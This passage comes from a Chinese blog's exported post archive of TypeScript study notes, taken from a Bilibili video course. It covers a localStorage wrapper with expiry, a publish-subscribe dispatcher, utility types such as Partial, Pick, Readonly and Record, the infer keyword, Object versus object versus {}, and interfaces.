class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">StorageCls</span> &#123;</span><br><span class="line">  <span class="attr">get</span>:&lt;T&gt;<span class="function">(<span class="params">key:Key</span>)=&gt;</span><span class="title class_">Result</span>&lt;T&gt;</span><br><span class="line">  <span class="attr">set</span>:&lt;T&gt;<span class="function">(<span class="params">key:Key,value:T,expire:Expire</span>)=&gt;</span><span class="built_in">void</span></span><br><span class="line">  <span class="attr">remove</span>:<span class="function">(<span class="params">key:Key</span>)=&gt;</span><span class="built_in">void</span></span><br><span class="line">  <span class="attr">clear</span>:<span class="function">()=&gt;</span><span class="built_in">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心代码(&#x2F;src&#x2F;index.ts)：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// expire：过期时间key   permanent：永不过期</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">StorageCls</span>, <span class="title class_">Key</span>, <span class="title class_">Expire</span>, <span class="title class_">Data</span>, <span class="title class_">Result</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./type&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Dictionaries</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./enum&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Storage</span> <span class="keyword">implements</span> <span class="title class_">StorageCls</span> &#123;</span><br><span class="line">  set&lt;T&gt;(<span class="attr">key</span>:<span class="title class_">Key</span>, <span class="attr">value</span>:T, <span class="attr">expire</span>:<span class="title class_">Expire</span>=<span class="title class_">Dictionaries</span>.<span class="property">permanent</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> data = &#123;</span><br><span class="line">      value,    <span class="comment">// 真正的值</span></span><br><span class="line">      [<span class="title class_">Dictionaries</span>.<span class="property">expire</span>]:expire    <span class="comment">// 过期时间</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 存入</span></span><br><span class="line">    <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(key,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  get&lt;T&gt;(<span class="attr">key</span>:<span class="title class_">Key</span>):<span class="title class_">Result</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> value = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(key)</span><br><span class="line">    <span class="comment">// 判断是否有该key的存值</span></span><br><span class="line">    <span class="keyword">if</span>(value) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="attr">data</span>:<span class="title class_">Data</span>&lt;T&gt; = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(value)</span><br><span class="line">      <span class="keyword">const</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>()</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">typeof</span> data[<span class="title class_">Dictionaries</span>.<span class="property">expire</span>] === <span class="string">&quot;number&quot;</span> &amp;&amp; data[<span class="title class_">Dictionaries</span>.<span class="property">expire</span>] &lt; now) &#123;</span><br><span class="line">        <span class="comment">// 如果有设置过期时间，且值已过期</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">remove</span>(key)</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          <span class="attr">message</span>: <span class="string">`<span class="subst">$&#123;key&#125;</span>已过期`</span>,</span><br><span class="line">          <span class="attr">value</span>: <span class="literal">null</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 没有过期，正常返回</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          <span class="attr">message</span>: <span class="string">&quot;取值成功&quot;</span>,</span><br><span class="line">          <span class="attr">value</span>: data.<span class="property">value</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 没有该key的存值</span></span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">message</span>: <span class="string">`<span class="subst">$&#123;key&#125;</span>无效`</span>,</span><br><span class="line">        <span class="attr">value</span>: <span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">remove</span>(<span class="params">key:Key</span>) &#123;</span><br><span class="line">    <span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(key)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">clear</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">localStorage</span>.<span class="title function_">clear</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="发布订阅模式实例"><a href="#发布订阅模式实例" class="headerlink" title="发布订阅模式实例"></a>发布订阅模式实例</h2><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307211549220.png"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307211701836.png" alt="目录"></p>
<p>定义类型(&#x2F;src&#x2F;type&#x2F;index.ts)：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">Event</span> &#123;</span><br><span class="line">  <span class="comment">// 绑定事件，当name事件被触发时，调用回调函数</span></span><br><span class="line">  <span class="attr">on</span>:<span class="function">(<span class="params">name:<span class="built_in">string</span>,fn:<span class="built_in">Function</span></span>)=&gt;</span><span class="built_in">void</span></span><br><span class="line">  <span class="comment">// 触发name事件，并传一些参数</span></span><br><span class="line">  <span class="attr">emit</span>:<span class="function">(<span class="params">name:<span class="built_in">string</span>,...args:<span class="built_in">any</span>[]</span>)=&gt;</span><span class="built_in">void</span></span><br><span class="line">  <span class="comment">// 解除name事件对某回调函数的绑定</span></span><br><span class="line">  <span class="attr">off</span>:<span class="function">(<span class="params">name:<span class="built_in">string</span>,fu:<span class="built_in">Function</span></span>)=&gt;</span><span class="built_in">void</span></span><br><span class="line">  <span class="comment">// 绑定事件，但只执行一次</span></span><br><span class="line">  <span class="attr">once</span>:<span class="function">(<span class="params">name:<span class="built_in">string</span>,fn:<span class="built_in">Function</span></span>)=&gt;</span><span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">List</span> &#123;</span><br><span class="line">  <span class="comment">// 事件名:事件的回调函数数组</span></span><br><span class="line">  [<span class="attr">key</span>:<span class="built_in">string</span>]:<span class="title class_">Function</span>[]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>核心代码(&#x2F;src&#x2F;index.ts)：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Event</span>, <span class="title class_">List</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./type&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dispatch</span> <span class="keyword">implements</span> <span class="title class_">Event</span> &#123;</span><br><span class="line">  <span class="attr">list</span>:<span class="title class_">List</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">list</span> = &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">on</span>(<span class="params">name:<span class="built_in">string</span>,fn:<span class="built_in">Function</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 如果已经注册了name，能取到一个数组，否则是undefined</span></span><br><span class="line">    <span class="keyword">const</span> cbs = <span class="variable language_">this</span>.<span class="property">list</span>[name] || []</span><br><span class="line">    <span class="comment">// 将回调函数fn加入回调函数数组中</span></span><br><span class="line">    cbs.<span class="title function_">push</span>(fn)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">list</span>[name] = cbs</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">emit</span>(<span class="params">name:<span class="built_in">string</span>,...args:<span class="built_in">any</span>[]</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> cbs = <span class="variable language_">this</span>.<span class="property">list</span>[name]</span><br><span class="line">    <span class="keyword">if</span>(cbs) &#123;</span><br><span class="line">      <span class="comment">// 逐一调用回调函数并传参</span></span><br><span class="line">      cbs.<span class="title function_">forEach</span>(<span class="function"><span class="params">cb</span>=&gt;</span> &#123;</span><br><span class="line">        cb.<span class="title function_">apply</span>(<span class="variable language_">this</span>,args)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`没有注册<span class="subst">$&#123;name&#125;</span>事件`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">off</span>(<span class="params">name:<span class="built_in">string</span>,fn:<span class="built_in">Function</span></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> cbs = <span class="variable language_">this</span>.<span class="property">list</span>[name]</span><br><span class="line">    <span class="keyword">if</span>(cbs &amp;&amp; fn) &#123;</span><br><span class="line">      <span class="comment">// 寻找fn并删除</span></span><br><span class="line">      <span class="keyword">const</span> index = cbs.<span class="title function_">findIndex</span>(<span class="function"><span class="params">fns</span>=&gt;</span>fns===fn)</span><br><span class="line">      cbs.<span class="title function_">splice</span>(index,<span class="number">1</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`没有注册<span class="subst">$&#123;name&#125;</span>事件或函数有误`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">once</span>(<span class="params">name:<span class="built_in">string</span>,fn:<span class="built_in">Function</span></span>) &#123;</span><br><span class="line">    <span class="comment">// 使用临时函数temp包装传入的函数</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">temp</span> = (<span class="params">...args:<span class="built_in">any</span>[]</span>)=&gt; &#123;</span><br><span class="line">      fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>,args)</span><br><span class="line">      <span class="comment">// 调用一次回调后就会解绑</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">off</span>(name,temp)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">on</span>(name,temp)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Partial和Pick</title>
    <url>/web/study/TypeScript/23.Partial%E5%92%8CPick.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="Partial"><a href="#Partial" class="headerlink" title="Partial"></a>Partial</h1><p>源码：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将T中的所有属性设为可选</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Partial</span>&lt;T&gt; = &#123;</span><br><span class="line">    [P <span class="keyword">in</span> keyof T]?: T[P]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类型使用Partial转换后，属性全部变得可选</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307221257484.png"></p>
<h1 id="Pick"><a href="#Pick" class="headerlink" title="Pick"></a>Pick</h1><p>源码：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// K是一些T的键，从T中挑选属性</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Pick</span>&lt;T, K <span class="keyword">extends</span> keyof T&gt; = &#123;</span><br><span class="line">  [P <span class="keyword">in</span> K]: T[P]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Person使用Pick挑选后，剩下了gender和age两个属性（和Ex类型对应）</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307221305012.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Readonly和Record</title>
    <url>/web/study/TypeScript/24.Readonly%E5%92%8CRecord.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="Readonly"><a href="#Readonly" class="headerlink" title="Readonly"></a>Readonly</h1><p>源码：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将T中的所有属性设为只读</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Readonly</span>&lt;T&gt; = &#123;</span><br><span class="line">  <span class="keyword">readonly</span> [P <span class="keyword">in</span> keyof T]: T[P]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类型使用Readonly转换后，属性全部变为只读</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307221324582.png"></p>
<h1 id="Record"><a href="#Record" class="headerlink" title="Record"></a>Record</h1><p>源码：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// K是键的类型，即string|number|symbol</span></span><br><span class="line"><span class="comment">// 同时约束键和值的类型</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Record</span>&lt;K <span class="keyword">extends</span> keyof <span class="built_in">any</span>, T&gt; = &#123;</span><br><span class="line">  [P <span class="keyword">in</span> K]: T</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Person通过key记录后，规定了一个整齐的数据结构</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307221343636.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>infer</title>
    <url>/web/study/TypeScript/25.infer.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="infer"><a href="#infer" class="headerlink" title="infer"></a>infer</h1><p>infer关键字用于在类型表达式中声明局部变量，充当占位符</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果是数组类型，就返回数组元素的类型，否则，传入什么类型就返回什么类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一般的写法</span></span><br><span class="line"><span class="comment">// type Type&lt;T&gt; = T extends Array&lt;any&gt;? T[number]:T</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// infer简化后的写法</span></span><br><span class="line"><span class="comment">// U并不是泛型，它相当于一个占位符，在此处会读取Array中的类型</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Type</span>&lt;T&gt; = T <span class="keyword">extends</span> <span class="title class_">Array</span>&lt;infer U&gt;? <span class="attr">U</span>: T</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> A = <span class="title class_">Type</span>&lt;<span class="built_in">string</span>|<span class="built_in">number</span>&gt;          <span class="comment">// string|number</span></span><br><span class="line"><span class="keyword">type</span> B = <span class="title class_">Type</span>&lt;(<span class="built_in">string</span>|<span class="built_in">number</span>)[]&gt;      <span class="comment">// string|number</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Arr</span>&lt;T&gt; = T <span class="keyword">extends</span> <span class="title class_">Array</span>&lt;infer U&gt;? <span class="attr">U</span>: <span class="built_in">never</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> C = <span class="title class_">Arr</span>&lt;[<span class="built_in">string</span>,<span class="built_in">number</span>]&gt;       <span class="comment">// string | number</span></span><br><span class="line"><span class="keyword">type</span> D = <span class="title class_">Arr</span>&lt;<span class="built_in">string</span>&gt;                <span class="comment">// never</span></span><br></pre></td></tr></table></figure>

<h1 id="infer类型提取"><a href="#infer类型提取" class="headerlink" title="infer类型提取"></a>infer类型提取</h1><h2 id="提取头部元素"><a href="#提取头部元素" class="headerlink" title="提取头部元素"></a>提取头部元素</h2><ol>
<li>泛型T被约束为只能是数组类型</li>
<li>通过infer提取第一个元素的类型First，后面的元素则是任意类型</li>
<li>返回局部变量First</li>
</ol>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Arr</span> = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>]</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">First</span>&lt;T <span class="keyword">extends</span> <span class="built_in">any</span>[]&gt; = T <span class="keyword">extends</span> [infer <span class="title class_">First</span>,...<span class="built_in">any</span>[]]? <span class="title class_">First</span>: []</span><br><span class="line"><span class="keyword">type</span> a = <span class="title class_">First</span>&lt;<span class="title class_">Arr</span>&gt;     <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 同理，这是提取尾部元素</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Last</span>&lt;T <span class="keyword">extends</span> <span class="built_in">any</span>[]&gt; = T <span class="keyword">extends</span> [...<span class="built_in">any</span>[],infer <span class="title class_">Last</span>]? <span class="title class_">Last</span>: []</span><br></pre></td></tr></table></figure>

<h2 id="剔除头部元素"><a href="#剔除头部元素" class="headerlink" title="剔除头部元素"></a>剔除头部元素</h2><ol>
<li>泛型T被约束为只能是数组类型</li>
<li>第一个元素的类型不用管，通过infer提取剩余元素的类型Rest</li>
<li>返回局部变量Rest</li>
</ol>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Arr</span> = [<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>]</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">First</span>&lt;T <span class="keyword">extends</span> <span class="built_in">any</span>[]&gt; = T <span class="keyword">extends</span> [<span class="built_in">unknown</span>,...infer <span class="title class_">Rest</span>]? <span class="title class_">Rest</span>: []</span><br><span class="line"><span class="keyword">type</span> a = <span class="title class_">First</span>&lt;<span class="title class_">Arr</span>&gt;   <span class="comment">// [1, 4, 5, 1, 4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 同理，这是剔除尾部元素</span></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Last</span>&lt;T <span class="keyword">extends</span> <span class="built_in">any</span>[]&gt; = T <span class="keyword">extends</span> [...infer <span class="title class_">Rest</span>,<span class="built_in">unknown</span>]? <span class="title class_">Rest</span>: []</span><br></pre></td></tr></table></figure>

<h1 id="infer递归"><a href="#infer递归" class="headerlink" title="infer递归"></a>infer递归</h1><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Arr</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Reverse</span>&lt;T <span class="keyword">extends</span> <span class="built_in">any</span>[]&gt; = </span><br><span class="line">  T <span class="keyword">extends</span> [infer <span class="title class_">First</span>, ...infer rest]? [...<span class="title class_">Reverse</span>&lt;rest&gt;, <span class="title class_">First</span>]: T</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Res</span> = <span class="title class_">Reverse</span>&lt;<span class="title class_">Arr</span>&gt;     <span class="comment">// [4, 3, 2, 1]</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Object、object和{}</title>
    <url>/web/study/TypeScript/3.Object%E3%80%81object%E5%92%8C%7B%7D.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<p>object、Object和{}三个类型是有差别的</p>
<h1 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202307021645490.png"></p>
<p>Object类型是所有Object类的实例的类型，由以下两个接口来定义</p>
<ul>
<li>Object接口定义了<code>Object.prototype</code>原型对象上的属性；</li>
<li>ObjectConstructor接口定义了Object类的属性， 如<code>Object.create()</code></li>
</ul>
<p>Object类型和原型链有关，因为原型链顶层就是Object，所以所有基本类型和引用类型最终都指向Object</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="title class_">Object</span></span><br><span class="line">a = <span class="number">114</span>       <span class="comment">// OK</span></span><br><span class="line">a = <span class="string">&quot;yajue&quot;</span>   <span class="comment">// OK</span></span><br><span class="line">a = <span class="literal">false</span>     <span class="comment">// OK</span></span><br><span class="line">a = &#123;&#125;        <span class="comment">// OK</span></span><br><span class="line">a = &#123;<span class="attr">b</span>:<span class="number">514</span>&#125;   <span class="comment">// OK</span></span><br><span class="line">a = []        <span class="comment">// OK</span></span><br><span class="line">a = <span class="function">()=&gt;</span> &#123;&#125;   <span class="comment">// OK</span></span><br><span class="line">a.<span class="property">c</span> = <span class="number">1919</span>    <span class="comment">// 不OK</span></span><br></pre></td></tr></table></figure>

<h1 id="object"><a href="#object" class="headerlink" title="object"></a>object</h1><p>object代表所有引用类型，例如数组、对象、函数等，常用于泛型约束</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="built_in">object</span></span><br><span class="line">a = <span class="number">114</span>       <span class="comment">// 不OK</span></span><br><span class="line">a = <span class="string">&quot;yajue&quot;</span>   <span class="comment">// 不OK</span></span><br><span class="line">a = <span class="literal">false</span>     <span class="comment">// 不OK</span></span><br><span class="line">a = &#123;&#125;        <span class="comment">// OK      </span></span><br><span class="line">a = []        <span class="comment">// OK</span></span><br><span class="line">a = <span class="function">()=&gt;</span> &#123;&#125;   <span class="comment">// OK</span></span><br></pre></td></tr></table></figure>

<h1 id=""><a href="#" class="headerlink" title="{}"></a>{}</h1><p>相当于new Object()，就和Object类型基本一样，包含几乎所有类型，但只能被整体赋值，不能修改属性和方法</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: &#123;&#125;</span><br><span class="line">a = <span class="number">114</span>       <span class="comment">// OK</span></span><br><span class="line">a = <span class="string">&quot;yajue&quot;</span>   <span class="comment">// OK</span></span><br><span class="line">a = <span class="literal">false</span>     <span class="comment">// OK</span></span><br><span class="line">a = &#123;&#125;        <span class="comment">// OK      </span></span><br><span class="line">a = &#123;<span class="attr">b</span>:<span class="number">514</span>&#125;   <span class="comment">// OK      </span></span><br><span class="line">a = []        <span class="comment">// OK</span></span><br><span class="line">a = <span class="function">()=&gt;</span> &#123;&#125;   <span class="comment">// OK</span></span><br><span class="line">a.<span class="property">c</span> = <span class="number">1919</span>    <span class="comment">// 不OK</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>接口和对象类型</title>
    <url>/web/study/TypeScript/4.%E6%8E%A5%E5%8F%A3%E5%92%8C%E5%AF%B9%E8%B1%A1%E7%B1%BB%E5%9E%8B.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="对象的类型"><a href="#对象的类型" class="headerlink" title="对象的类型"></a>对象的类型</h1><p>TS中，使用关键字interface（接口）定义一个对象</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接口名通常需要首字母大写</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 属性必须要和接口一一对应</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span></span><br><span class="line">  <span class="comment">// 不能缺少属性</span></span><br><span class="line">  <span class="attr">age</span>: <span class="number">24</span>,</span><br><span class="line">  <span class="comment">// 不能多出属性</span></span><br><span class="line">  <span class="comment">// add: &quot;下北泽&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="接口合并"><a href="#接口合并" class="headerlink" title="接口合并"></a>接口合并</h1><p>定义的重名接口会被合并</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">add</span>: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分别定义重名接口，接口会被合并</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">24</span>,</span><br><span class="line">  <span class="comment">// 因为接口合并了，所以需要add属性</span></span><br><span class="line">  <span class="attr">add</span>: <span class="string">&quot;下北泽&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="任意属性"><a href="#任意属性" class="headerlink" title="任意属性"></a>任意属性</h1><p>如果只对部分属性有强制要求，其他属性随意添加，可以使用索引签名</p>
<p>一旦定义了任意属性，那么确定属性和可选属性的类型都必须是它的类型的子集</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span></span><br><span class="line">  <span class="comment">// 索引签名，定义其他的任意属性</span></span><br><span class="line">  [<span class="attr">propName</span>: <span class="built_in">string</span>]: <span class="built_in">any</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// name和age必须有，可以随意添加更多属性</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">24</span>,</span><br><span class="line">  <span class="attr">add</span>: <span class="string">&quot;下北泽&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="可选属性"><a href="#可选属性" class="headerlink" title="可选属性"></a>可选属性</h1><p>定义可有可无的属性</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span></span><br><span class="line">  age?: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// name必须有，age可有可无</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="title class_">Person</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span>,</span><br><span class="line">  <span class="comment">// 没有age也可以</span></span><br><span class="line">  <span class="comment">// age: 24,</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="只读属性"><a href="#只读属性" class="headerlink" title="只读属性"></a>只读属性</h1><p>定义只能被读取、不能被修改的属性，常用于方法（值为函数的属性）和后台返回的id值</p>
